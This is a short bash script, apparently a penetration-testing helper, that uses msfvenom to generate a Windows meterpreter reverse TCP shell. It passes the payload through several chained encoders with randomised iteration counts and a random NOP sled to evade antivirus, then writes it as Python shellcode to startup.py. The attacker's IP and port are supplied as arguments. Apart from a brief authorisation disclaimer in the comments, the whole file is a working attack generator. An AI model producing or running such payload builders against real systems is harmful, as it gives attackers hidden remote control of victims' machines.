#!/bin/bash

# This script will output a meterpreter reverse shell
# in python format.  You must know how to turn this into
# effective use.  This script is only intended to assist
# in the creation of a very specific target.
# Use at your own risk and only against system for which
# you have authorization. 

RAND_ENC1=$((1 + RANDOM % 30))
RAND_ENC2=$((1 + RANDOM % 20))
RAND_ENC3=$((1 + RANDOM % 10))
RAND_NOP=$((1 + RANDOM % 1024))

LHOST=$1
LPORT=$2

if [ "${LHOST}x" = "x" ]; then
	echo "You must specify the host you want the reverse shell to connect to!"
	echo 
	echo "Usage: $0 <ip.of.atta.cker> <port#>"
	exit 255
fi
if [ "${LPORT}x" = "x" ]; then
	echo "You must specify the port you want to connect to on the local host!"
	echo 
	echo "Usage: $0 <ip.of.atta.cker> <port#>"
	exit 254
fi

msfvenom -p windows/meterpreter/reverse_tcp LHOST=${LHOST} LPORT=${LPORT} R -n ${RAND_NOP} -e x86/shikata_ga_nai -i ${RAND_ENC1} -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i ${RAND_ENC2} -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i ${RAND_ENC3} -f python -o startup.py
